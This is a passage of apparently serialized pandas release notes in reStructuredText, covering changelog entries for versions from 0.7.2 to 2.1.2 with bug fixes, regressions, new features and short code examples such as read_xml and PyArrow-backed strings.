``&`` and ``|`` raising ``KeyError`` (:issue:`51688`)\n\nStyler\n^^^^^^\n- Fix :meth:`~pandas.io.formats.style.Styler.background_gradient` for nullable dtype :class:`Series` with ``NA`` values (:issue:`50712`)\n\nMetadata\n^^^^^^^^\n- Fixed metadata propagation in :meth:`DataFrame.corr` and :meth:`DataFrame.cov` (:issue:`28283`)\n\nOther\n^^^^^\n- Bug in incorrectly accepting dtype strings containing \"[pyarrow]\" more than once (:issue:`51548`)\n- Bug in :meth:`Series.searchsorted` inconsistent behavior when accepting :class:`DataFrame` as parameter ``value`` (:issue:`49620`)\n- Bug in :func:`array` failing to raise on :class:`DataFrame` inputs (:issue:`51167`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.0rc0..v2.0.0\n", "0.8.1": ".. _whatsnew_0801:\n\nVersion 0.8.1 (July 22, 2012)\n-----------------------------\n\n{{ header }}\n\n\nThis release includes a few new features, performance enhancements, and over 30\nbug fixes from 0.8.0.  New features include notably NA friendly string\nprocessing functionality and a series of new plot types and options.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add :ref:`vectorized string processing methods <text.string_methods>`\n    accessible via Series.str (:issue:`620`)\n  - Add option to disable adjustment in EWMA (:issue:`1584`)\n  - :ref:`Radviz plot <visualization.radviz>` (:issue:`1566`)\n  - :ref:`Parallel coordinates plot <visualization.parallel_coordinates>`\n  - :ref:`Bootstrap plot <visualization.bootstrap>`\n  - Per column styles and secondary y-axis plotting (:issue:`1559`)\n  - New datetime converters millisecond plotting  (:issue:`1599`)\n  - Add option to disable \"sparse\" display of hierarchical indexes (:issue:`1538`)\n  - Series/DataFrame's ``set_index`` method can :ref:`append levels\n    <indexing.set_index>` to an existing Index/MultiIndex (:issue:`1569`, :issue:`1577`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n  - Improved implementation of rolling min and max (thanks to `Bottleneck\n    <https://bottleneck.readthedocs.io>`__ !)\n  - Add accelerated ``'median'`` GroupBy option (:issue:`1358`)\n  - Significantly improve the performance of parsing ISO8601-format date\n    strings with ``DatetimeIndex`` or ``to_datetime`` (:issue:`1571`)\n  - Improve the performance of GroupBy on single-key aggregations and use with\n    Categorical types\n  - Significant datetime parsing performance improvements\n\n\n\n.. _whatsnew_0.8.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.8.0..v0.8.1\n", "1.3.4": ".. _whatsnew_134:\n\nWhat's new in 1.3.4 (October 17, 2021)\n--------------------------------------\n\nThese are the changes in pandas 1.3.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.convert_dtypes` incorrectly converts byte strings to strings (:issue:`43183`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` were failing silently with mixed data types along ``axis=1`` and :class:`MultiIndex` (:issue:`43209`)\n- Fixed regression in :func:`merge` with integer and ``NaN`` keys failing with ``outer`` merge (:issue:`43550`)\n- Fixed regression in :meth:`DataFrame.corr` raising ``ValueError`` with ``method=\"spearman\"`` on 32-bit platforms (:issue:`43588`)\n- Fixed performance regression in :meth:`MultiIndex.equals` (:issue:`43549`)\n- Fixed performance regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` with :class:`StringDtype` (:issue:`41596`)\n- Fixed regression in :meth:`Series.cat.reorder_categories` failing to update the categories on the ``Series`` (:issue:`43232`)\n- Fixed regression in :meth:`Series.cat.categories` setter failing to update the categories on the ``Series`` (:issue:`43334`)\n- Fixed regression in :func:`read_csv` raising ``UnicodeDecodeError`` exception when ``memory_map=True`` (:issue:`43540`)\n- Fixed regression in :meth:`DataFrame.explode` raising ``AssertionError`` when ``column`` is any scalar which is not a string (:issue:`43314`)\n- Fixed regression in :meth:`Series.aggregate` attempting to pass ``args`` and ``kwargs`` multiple times to the user supplied ``func`` in certain cases (:issue:`43357`)\n- Fixed regression when iterating over a :class:`DataFrame.groupby.rolling` object causing the resulting DataFrames to have an incorrect index if the input groupings were not sorted (:issue:`43386`)\n- Fixed regression in :meth:`DataFrame.groupby.rolling.cov` and :meth:`DataFrame.groupby.rolling.corr` computing incorrect results if the input groupings were not sorted (:issue:`43386`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :meth:`pandas.DataFrame.groupby.rolling` and :class:`pandas.api.indexers.FixedForwardWindowIndexer` leading to segfaults and window endpoints being mixed across groups (:issue:`43267`)\n- Fixed bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` with datetimelike values including ``NaT`` values returning incorrect results (:issue:`43132`)\n- Fixed bug in :meth:`Series.aggregate` not passing the first ``args`` to the user supplied ``func`` in certain cases (:issue:`43357`)\n- Fixed memory leaks in :meth:`Series.rolling.quantile` and :meth:`Series.rolling.median` (:issue:`43339`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.24`` (:issue:`43729`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.3..v1.3.4\n", "0.7.2": ".. _whatsnew_0702:\n\nVersion 0.7.2 (March 16, 2012)\n------------------------------\n\n{{ header }}\n\n\nThis release targets bugs in 0.7.1, and adds a few minor features.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add additional tie-breaking methods in DataFrame.rank (:issue:`874`)\n  - Add ascending parameter to rank in Series, DataFrame (:issue:`875`)\n  - Add coerce_float option to DataFrame.from_records (:issue:`893`)\n  - Add sort_columns parameter to allow unsorted plots (:issue:`918`)\n  - Enable column access via attributes on GroupBy (:issue:`882`)\n  - Can pass dict of values to DataFrame.fillna (:issue:`661`)\n  - Can select multiple hierarchical groups by passing list of values in .ix\n    (:issue:`134`)\n  - Add ``axis`` option to DataFrame.fillna (:issue:`174`)\n  - Add level keyword to ``drop`` for dropping values from a level (:issue:`159`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n  - Use khash for Series.value_counts, add raw function to algorithms.py (:issue:`861`)\n  - Intercept __builtin__.sum in groupby (:issue:`885`)\n\n\n\n.. _whatsnew_0.7.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.1..v0.7.2\n", "1.4.3": ".. _whatsnew_143:\n\nWhat's new in 1.4.3 (June 23, 2022)\n-----------------------------------\n\nThese are the changes in pandas 1.4.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.concat:\n\nBehavior of ``concat`` with empty or all-NA DataFrame columns\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe behavior change in version 1.4.0 to stop ignoring the data type\nof empty or all-NA columns with float or object dtype in :func:`concat`\n(:ref:`whatsnew_140.notable_bug_fixes.concat_with_empty_or_all_na`) has been\nreverted (:issue:`45637`).\n\n\n.. _whatsnew_143.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.replace` when the replacement value was explicitly ``None`` when passed in a dictionary to ``to_replace`` also casting other columns to object dtype even when there were no values to replace (:issue:`46634`)\n- Fixed regression in :meth:`DataFrame.to_csv` raising error when :class:`DataFrame` contains extension dtype categorical column (:issue:`46297`, :issue:`46812`)\n- Fixed regression in representation of ``dtypes`` attribute of :class:`MultiIndex` (:issue:`46900`)\n- Fixed regression when setting values with :meth:`DataFrame.loc` updating :class:`RangeIndex` when index was set as new column and column was updated afterwards (:issue:`47128`)\n- Fixed regression in :meth:`DataFrame.fillna` and :meth:`DataFrame.update` creating a copy when updating inplace (:issue:`47188`)\n- Fixed regression in :meth:`DataFrame.nsmallest` led to wrong results when the sorting column has ``np.nan`` values (:issue:`46589`)\n- Fixed regression in :func:`read_fwf` raising ``ValueError`` when ``widths`` was specified with ``usecols`` (:issue:`46580`)\n- Fixed regression in :func:`concat` not sorting columns for mixed column names (:issue:`47127`)\n- Fixed regression in :meth:`.Groupby.transform` and :meth:`.Groupby.agg` failing with ``engine=\"numba\"`` when the index was a :class:`MultiIndex` (:issue:`46867`)\n- Fixed regression in ``NaN`` comparison for :class:`Index` operations where the same object was compared (:issue:`47105`)\n- Fixed regression is :meth:`.Styler.to_latex` and :meth:`.Styler.to_html` where ``buf`` failed in combination with ``encoding`` (:issue:`47053`)\n- Fixed regression in :func:`read_csv` with ``index_col=False`` identifying first row as index names when ``header=None`` (:issue:`46955`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` when used with list-likes or dict-likes and ``axis=1`` that would give incorrect results; now raises ``NotImplementedError`` (:issue:`46995`)\n- Fixed regression in :meth:`DataFrame.resample` and :meth:`DataFrame.rolling` when used with list-likes or dict-likes and ``axis=1`` that would raise an unintuitive error message; now raises ``NotImplementedError`` (:issue:`46904`)\n- Fixed regression in :func:`testing.assert_index_equal` when ``check_order=False`` and :class:`Index` has extension or object dtype (:issue:`47207`)\n- Fixed regression in :func:`read_excel` returning ints as floats on certain input sheets (:issue:`46988`)\n- Fixed regression in :meth:`DataFrame.shift` when ``axis`` is ``columns`` and ``fill_value`` is absent, ``freq`` is ignored (:issue:`47039`)\n- Fixed regression in :meth:`DataFrame.to_json` causing a segmentation violation when :class:`DataFrame` is created with an ``index`` parameter of the type :class:`PeriodIndex` (:issue:`46683`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`pandas.eval`, :meth:`DataFrame.eval` and :meth:`DataFrame.query` where passing empty ``local_dict`` or ``global_dict`` was treated as passing ``None`` (:issue:`47084`)\n- Most I/O methods no longer suppress ``OSError`` and ``ValueError`` when closing file handles (:issue:`47136`)\n- Improving error message raised by :meth:`DataFrame.from_dict` when passing an invalid ``orient`` parameter (:issue:`47450`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.30`` (:issue:`41935`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_143.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.2..v1.4.3\n", "0.9.0": ".. _whatsnew_0900:\n\n{{ header }}\n\n\nVersion 0.9.0 (October 7, 2012)\n-------------------------------\n\nThis is a major release from 0.8.1 and includes several new features and\nenhancements along with a large number of bug fixes. New features include\nvectorized unicode encoding/decoding for ``Series.str``, ``to_latex`` method to\nDataFrame, more flexible parsing of boolean values, and enabling the download of\noptions data from Yahoo! Finance.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add ``encode`` and ``decode`` for unicode handling to :ref:`vectorized\n    string processing methods <text.string_methods>` in Series.str  (:issue:`1706`)\n  - Add ``DataFrame.to_latex`` method (:issue:`1735`)\n  - Add convenient expanding window equivalents of all rolling_* ops (:issue:`1785`)\n  - Add Options class to pandas.io.data for fetching options data from Yahoo!\n    Finance (:issue:`1748`, :issue:`1739`)\n  - More flexible parsing of boolean values (Yes, No, TRUE, FALSE, etc)\n    (:issue:`1691`, :issue:`1295`)\n  - Add ``level`` parameter to ``Series.reset_index``\n  - ``TimeSeries.between_time`` can now select times across midnight (:issue:`1871`)\n  - Series constructor can now handle generator as input (:issue:`1679`)\n  - ``DataFrame.dropna`` can now take multiple axes (tuple/list) as input\n    (:issue:`924`)\n  - Enable ``skip_footer`` parameter in ``ExcelFile.parse`` (:issue:`1843`)\n\nAPI changes\n~~~~~~~~~~~\n\n  - The default column names when ``header=None`` and no columns names passed to\n    functions like ``read_csv`` has changed to be more Pythonic and amenable to\n    attribute access:\n\n.. ipython:: python\n\n   import io\n\n   data = \"\"\"\n   0,0,1\n   1,1,0\n   0,1,0\n   \"\"\"\n   df = pd.read_csv(io.StringIO(data), header=None)\n   df\n\n\n- Creating a Series from another Series, passing an index, will cause reindexing\n  to happen inside rather than treating the Series like an ndarray. Technically\n  improper usages like ``Series(df[col1], index=df[col2])`` that worked before\n  \"by accident\" (this was never intended) will lead to all NA Series in some\n  cases. To be perfectly clear:\n\n.. ipython:: python\n\n   s1 = pd.Series([1, 2, 3])\n   s1\n\n   s2 = pd.Series(s1, index=[\"foo\", \"bar\", \"baz\"])\n   s2\n\n- Deprecated ``day_of_year`` API removed from PeriodIndex, use ``dayofyear``\n  (:issue:`1723`)\n\n- Don't modify NumPy suppress printoption to True at import time\n\n- The internal HDF5 data arrangement for DataFrames has been transposed.  Legacy\n  files will still be readable by HDFStore (:issue:`1834`, :issue:`1824`)\n\n- Legacy cruft removed: pandas.stats.misc.quantileTS\n\n- Use ISO8601 format for Period repr: monthly, daily, and on down (:issue:`1776`)\n\n- Empty DataFrame columns are now created as object dtype. This will prevent a\n  class of TypeErrors that was occurring in code where the dtype of a column\n  would depend on the presence of data or not (e.g. a SQL query having results)\n  (:issue:`1783`)\n\n- Setting parts of DataFrame/Panel using ix now aligns input Series/DataFrame\n  (:issue:`1630`)\n\n- ``first`` and ``last`` methods in ``GroupBy`` no longer drop non-numeric\n  columns (:issue:`1809`)\n\n- Resolved inconsistencies in specifying custom NA values in text parser.\n  ``na_values`` of type dict no longer override default NAs unless\n  ``keep_default_na`` is set to false explicitly (:issue:`1657`)\n\n- ``DataFrame.dot`` will not do data alignment, and also work with Series\n  (:issue:`1915`)\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n\n.. _whatsnew_0.9.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.8.1..v0.9.0\n", "2.1.2": ".. _whatsnew_212:\n\nWhat's new in 2.1.2 (October 26, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- Reverted deprecation of ``fill_method=None`` in :meth:`DataFrame.pct_change`, :meth:`Series.pct_change`, :meth:`DataFrameGroupBy.pct_change`, and :meth:`SeriesGroupBy.pct_change`; the values ``'backfill'``, ``'bfill'``, ``'pad'``, and ``'ffill'`` are still deprecated (:issue:`53491`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.join` where result has missing values and dtype is arrow backed string (:issue:`55348`)\n- Fixed regression in :meth:`~DataFrame.rolling` where non-nanosecond index or ``on`` column would produce incorrect results (:issue:`55026`, :issue:`55106`, :issue:`55299`)\n- Fixed regression in :meth:`DataFrame.resample` which was extrapolating back to ``origin`` when ``origin`` was outside its bounds (:issue:`55064`)\n- Fixed regression in :meth:`DataFrame.sort_index` which was not sorting correctly when the index was a sliced :class:`MultiIndex` (:issue:`55379`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` and :meth:`SeriesGroupBy.agg` where if the option ``compute.use_numba`` was set to True, groupby methods not supported by the numba engine would raise a ``TypeError`` (:issue:`55520`)\n- Fixed performance regression with wide DataFrames, typically involving methods where all columns were accessed individually (:issue:`55256`, :issue:`55245`)\n- Fixed regression in :func:`merge_asof` raising ``TypeError`` for ``by`` with datetime and timedelta dtypes (:issue:`55453`)\n- Fixed regression in :func:`read_parquet` when reading a file with a string column consisting of more than 2 GB of string data and using the ``\"string\"`` dtype (:issue:`55606`)\n- Fixed regression in :meth:`DataFrame.to_sql` not roundtripping datetime columns correctly for sqlite when using ``detect_types`` (:issue:`55554`)\n- Fixed regression in construction of certain DataFrame or Series subclasses (:issue:`54922`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :class:`.DataFrameGroupBy` reductions not preserving object dtype when ``infer_string`` is set (:issue:`55620`)\n- Fixed bug in :meth:`.SeriesGroupBy.value_counts` returning incorrect dtype for string columns (:issue:`55627`)\n- Fixed bug in :meth:`Categorical.equals` if other has arrow backed string dtype (:issue:`55364`)\n- Fixed bug in :meth:`DataFrame.__setitem__` not inferring string dtype for zero-dimensional array with ``infer_string=True`` (:issue:`55366`)\n- Fixed bug in :meth:`DataFrame.idxmin` and :meth:`DataFrame.idxmax` raising for arrow dtypes (:issue:`55368`)\n- Fixed bug in :meth:`DataFrame.interpolate` raising incorrect error message (:issue:`55347`)\n- Fixed bug in :meth:`Index.insert` raising when inserting ``None`` into :class:`Index` with ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`55365`)\n- Fixed bug in :meth:`Series.all`  and :meth:`Series.any` not treating missing values correctly for ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`55367`)\n- Fixed bug in :meth:`Series.floordiv` for :class:`ArrowDtype` (:issue:`55561`)\n- Fixed bug in :meth:`Series.mode` not sorting values for arrow backed string dtype (:issue:`55621`)\n- Fixed bug in :meth:`Series.rank` for ``string[pyarrow_numpy]`` dtype (:issue:`55362`)\n- Fixed bug in :meth:`Series.str.extractall` for :class:`ArrowDtype` dtype being converted to object (:issue:`53846`)\n- Fixed bug where PDEP-6 warning about setting an item of an incompatible dtype was being shown when creating a new conditional column (:issue:`55025`)\n- Silence ``Period[B]`` warnings introduced by :issue:`53446` during normal plotting activity (:issue:`55138`)\n- Fixed bug in :class:`Series` constructor not inferring string dtype when ``NA`` is the first value and ``infer_string`` is set (:issue:` 55655`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.other:\n\nOther\n~~~~~\n- Fixed non-working installation of optional dependency group ``output_formatting``. Replacing underscore ``_`` with a dash ``-`` fixes broken dependency resolution. A correct way to use now is ``pip install pandas[output-formatting]``.\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.1..v2.1.2\n", "1.3.0": ".. _whatsnew_130:\n\nWhat's new in 1.3.0 (July 2, 2021)\n----------------------------------\n\nThese are the changes in pandas 1.3.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. warning::\n\n   When reading new Excel 2007+ (``.xlsx``) files, the default argument\n   ``engine=None`` to :func:`read_excel` will now result in using the\n   `openpyxl <https://openpyxl.readthedocs.io/en/stable/>`_ engine in all cases\n   when the option :attr:`io.excel.xlsx.reader` is set to ``\"auto\"``.\n   Previously, some cases would use the\n   `xlrd <https://xlrd.readthedocs.io/en/latest/>`_ engine instead. See\n   :ref:`What's new 1.2.0 <whatsnew_120>` for background on this change.\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_130.enhancements.read_csv_json_http_headers:\n\nCustom HTTP(s) headers when reading csv or json files\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen reading from a remote URL that is not handled by fsspec (e.g. HTTP and\nHTTPS) the dictionary passed to ``storage_options`` will be used to create the\nheaders included in the request.  This can be used to control the User-Agent\nheader or send other custom headers (:issue:`36688`).\nFor example:\n\n.. code-block:: ipython\n\n    In [1]: headers = {\"User-Agent\": \"pandas\"}\n    In [2]: df = pd.read_csv(\n       ...:     \"https://download.bls.gov/pub/time.series/cu/cu.item\",\n       ...:     sep=\"\\t\",\n       ...:     storage_options=headers\n       ...: )\n\n.. _whatsnew_130.enhancements.read_to_xml:\n\nRead and write XML documents\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe added I/O support to read and render shallow versions of `XML`_ documents with\n:func:`read_xml` and :meth:`DataFrame.to_xml`. Using `lxml`_ as parser,\nboth XPath 1.0 and XSLT 1.0 are available. (:issue:`27554`)\n\n.. _XML: https://www.w3.org/standards/xml/core\n.. _lxml: https://lxml.de\n\n.. code-block:: ipython\n\n    In [1]: xml = \"\"\"<?xml version='1.0' encoding='utf-8'?>\n       ...: <data>\n       ...:  <row>\n       ...:     <shape>square</shape>\n       ...:     <degrees>360</degrees>\n       ...:     <sides>4.0</sides>\n       ...:  </row>\n       ...:  <row>\n       ...:     <shape>circle</shape>\n       ...:     <degrees>360</degrees>\n       ...:     <sides/>\n       ...:  </row>\n       ...:  <row>\n       ...:     <shape>triangle</shape>\n       ...:     <degrees>180</degrees>\n       ...:     <sides>3.0</sides>\n       ...:  </row>\n       ...:  </data>\"\"\"\n\n    In [2]: df = pd.read_xml(xml)\n    In [3]: df\n    Out[3]:\n          shape  degrees  sides\n    0    square      360    4.0\n    1    circle      360    NaN\n    2  triangle      180    3.0\n\n    In [4]: df.to_xml()\n    Out[4]:\n    <?xml version='1.0' encoding='utf-8'?>\n    <data>\n      <row>\n        <index>0</index>\n        <shape>square</shape>\n        <degrees>360</degrees>\n        <sides>4.0</sides>\n      </row>\n      <row>\n        <index>1</index>\n        <shape>circle</shape>\n        <degrees>360</degrees>\n        <sides/>\n      </row>\n      <row>\n        <index>2</index>\n        <shape>triangle</shape>\n        <degrees>180</degrees>\n        <sides>3.0</sides>\n      </row>\n    </data>\n\nFor more, see :ref:`io.xml` in the user guide on IO tools.\n\n.. _whatsnew_130.enhancements.styler:\n\nStyler enhancements\n^^^^^^^^^^^^^^^^^^^\n\nWe provided some focused development on :class:`.Styler`. See also the `Styler documentation <../user_guide/style.ipynb>`_\nwhich has been revised and improved (:issue:`39720`, :issue:`39317`, :issue:`40493`).\n\n - The method :meth:`.Styler.set_table_styles` can now accept more natural CSS language for arguments, such as ``'color:red;'`` instead of ``[('color', 'red')]`` (:issue:`39563`)\n - The methods :meth:`.Styler.highlight_null`, :meth:`.Styler.highlight_min`, and :meth:`.Styler.highlight_max` now allow custom CSS highlighting instead of the default background coloring (:issue:`40242`)\n - :meth:`.Styler.apply` now accepts functions that return an ``ndarray`` when ``axis=None``, making it now consistent with the ``axis=0`` and ``axis=1`` behavior (:issue:`39359`)\n - When incorrectly formatted CSS is given via :meth:`.Styler.apply` or :meth:`.Styler.applymap`, an error is now raised upon rendering (:issue:`39660`)\n - :meth:`.Styler.format` now accepts the keyword argument ``escape`` for optional HTML and LaTeX escaping (:issue:`40388`, :issue:`41619`)\n - :meth:`.Styler.background_gradient` has gained the argument ``gmap`` to supply a specific gradient map for shading (:issue:`22727`)\n - :meth:`.Styler.clear` now clears :attr:`Styler.hidden_index` and :attr:`Styler.hidden_columns` as well (:issue:`40484`)\n - Added the method :meth:`.Styler.highlight_between` (:issue:`39821`)\n - Added the method :meth:`.Styler.highlight_quantile` (:issue:`40926`)\n - Added the method :meth:`.Styler.text_gradient` (:issue:`41098`)\n - Added the method :meth:`.Styler.set_tooltips` to allow hover tooltips; this can be used enhance interactive displays (:issue:`21266`, :issue:`40284`)\n - Added the parameter ``precision`` to the method :meth:`.Styler.format` to control the display of floating point numbers (:issue:`40134`)\n - :class:`.Styler` rendered HTML output now follows the `w3 HTML Style Guide <https://www.w3schools.com/html/html5_syntax.asp>`_ (:issue:`39626`)\n - Many features of the :class:`.Styler` class are now either partially or fully usable on a DataFrame with a non-unique indexes or columns (:issue:`41143`)\n - One has greater control of the display through separate sparsification of the index or columns using the :ref:`new styler options <options.available>`, which are also usable via :func:`option_context` (:issue:`41142`)\n - Added the option ``styler.render.max_elements`` to avoid browser overload when styling large DataFrames (:issue:`40712`)\n - Added the method :meth:`.Styler.to_latex` (:issue:`21673`, :issue:`42320`), which also allows some limited CSS conversion (:issue:`40731`)\n - Added the method :meth:`.Styler.to_html` (:issue:`13379`)\n - Added the method :meth:`.Styler.set_sticky` to make index and column headers permanently visible in scrolling HTML frames (:issue:`29072`)\n\n.. _whatsnew_130.enhancements.dataframe_honors_copy_with_dict:\n\nDataFrame constructor honors ``copy=False`` with dict\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen passing a dictionary to :class:`DataFrame` with ``copy=False``,\na copy will no longer be made (:issue:`32960`).\n\n.. ipython:: python\n\n    arr = np.array([1, 2, 3])\n    df = pd.DataFrame({\"A\": arr, \"B\": arr.copy()}, copy=False)\n    df\n\n``df[\"A\"]`` remains a view on ``arr``:\n\n.. ipython:: python\n\n    arr[0] = 0\n    assert df.iloc[0, 0] == 0\n\nThe default behavior when not passing ``copy`` will remain unchanged, i.e.\na copy will be made.\n\n.. _whatsnew_130.enhancements.arrow_string:\n\nPyArrow backed string data type\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've enhanced the :class:`StringDtype`, an extension type dedicated to string data.\n(:issue:`39908`)\n\nIt is now possible to specify a ``storage`` keyword option to :class:`StringDtype`. Use\npandas options or specify the dtype using ``dtype='string[pyarrow]'`` to allow the\nStringArray to be backed by a PyArrow array instead of a NumPy array of Python objects.\n\nThe PyArrow backed StringArray requires pyarrow 1.0.0 or greater to be installed.\n\n.. warning::\n\n   ``string[pyarrow]`` is currently considered experimental. The implementation\n   and parts of the API may change without warning.\n\n.. ipython:: python\n\n   pd.Series(['abc', None, 'def'], dtype=pd.StringDtype(storage=\"pyarrow\"))\n\nYou can use the alias ``\"string[pyarrow]\"`` as well.\n\n.. ipython:: python\n\n   s = pd.Series(['abc', None, 'def'], dtype=\"string[pyarrow]\")\n   s\n\nYou can also create a PyArrow backed string array using pandas options.\n\n.. ipython:: python\n\n    with pd.option_context(\"string_storage\", \"pyarrow\"):\n        s = pd.Series(['abc', None, 'def'], dtype=\"string\")\n    s\n\nThe usual string accessor methods work. Where appropriate, the return type of the Series\nor columns of a DataFrame will also have string dtype.\n\n.. ipython:: python\n\n   s.str.upper()\n   s.str.split('b', expand=True).dtypes\n\nString accessor methods returning integers will return a value with :class:`Int64Dtype`\n\n.. ipython:: python\n\n   s.str.count(\"a\")\n\n.. _whatsnew_130.enhancements.centered_datetimelike_rolling_window:\n\nCentered datetime-like rolling windows\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen performing rolling calculations on DataFrame and Series\nobjects with a datetime-like index, a centered datetime-like window can now be\nused (:issue:`38780`).\nFor example:\n\n.. ipython:: python\n\n    df = pd.DataFrame(\n        {\"A\": [0, 1, 2, 3, 4]}, index=pd.date_range(\"2020\", periods=5, freq=\"1D\")\n    )\n    df\n    df.rolling(\"2D\", center=True).mean()\n\n\n.. _whatsnew_130.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- :meth:`DataFrame.rolling`, :meth:`Series.rolling`, :meth:`DataFrame.expanding`, and :meth:`Series.expanding` now support a ``method`` argument with a ``'table'`` option that performs the windowing operation over an entire :class:`DataFrame`. See :ref:`Window Overview <window.overview>` for performance and functional benefits (:issue:`15095`, :issue:`38995`)\n- :class:`.ExponentialMovingWindow` now support a ``online`` method that can perform ``mean`` calculations in an online fashion. See :ref:`Window Overview <window.overview>` (:issue:`41673`)\n- Added :meth:`MultiIndex.dtypes` (:issue:`37062`)\n- Added ``end`` and ``end_day`` options for the ``origin`` argument in :meth:`DataFrame.resample` (:issue:`37804`)\n- Improved error message when ``usecols`` and ``names`` do not match for :func:`read_csv` and ``engine=\"c\"`` (:issue:`29042`)\n- Improved consistency of error messages when passing an invalid ``win_type`` argument in :ref:`Window methods <api.window>` (:issue:`15969`)\n- :func:`read_sql_query` now accepts a ``dtype`` argument to cast the columnar data from the SQL database based on user input (:issue:`10285`)\n- :func:`read_csv` now raising ``ParserWarning`` if length of header or given names does not match length of data when ``usecols`` is not specified (:issue:`21768`)\n- Improved integer type mapping from pandas to SQLAlchemy when using :meth:`DataFrame.to_sql` (:issue:`35076`)\n- :func:`to_numeric` now supports downcasting of nullable ``ExtensionDtype`` objects (:issue:`33013`)\n- Added support for dict-like names in :class:`MultiIndex.set_names` and :class:`MultiIndex.rename` (:issue:`20421`)\n- :func:`read_excel` can now auto-detect .xlsb files and older .xls files (:issue:`35416`, :issue:`41225`)\n- :class:`ExcelWriter` now accepts an ``if_sheet_exists`` parameter to control the behavior of append mode when writing to existing sheets (:issue:`40230`)\n- :meth:`.Rolling.sum`, :meth:`.Expanding.sum`, :meth:`.Rolling.mean`, :meth:`.Expanding.mean`, :meth:`.ExponentialMovingWindow.mean`, :meth:`.Rolling.median`, :meth:`.Expanding.median`, :meth:`.Rolling.max`, :meth:`.Expanding.max`, :meth:`.Rolling.min`, and :meth:`.Expanding.min` now support `Numba <http://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`38895`, :issue:`41267`)\n- :meth:`DataFrame.apply` can now accept NumPy unary operators as strings, e.g. ``df.apply(\"sqrt\")``, which was already the case for :meth:`Series.apply` (:issue:`39116`)\n- :meth:`DataFrame.apply` can now accept non-callable DataFrame properties as strings, e.g. ``df.apply(\"size\")``, which was already the case for :meth:`Series.apply` (:issue:`39116`)\n- :meth:`DataFrame.applymap` can now accept kwargs to pass on to the user-provided ``func`` (:issue:`39987`)\n- Passing a :class:`DataFrame` indexer to ``iloc`` is now disallowed for :meth:`Series.__getitem__` and :meth:`DataFrame.__getitem__` (:issue:`39004`)\n- :meth:`Series.apply` can now accept list-like or dictionary-like arguments that aren't lists or dictionaries, e.g. ``ser.apply(np.array([\"sum\", \"mean\"]))``, which was already the case for 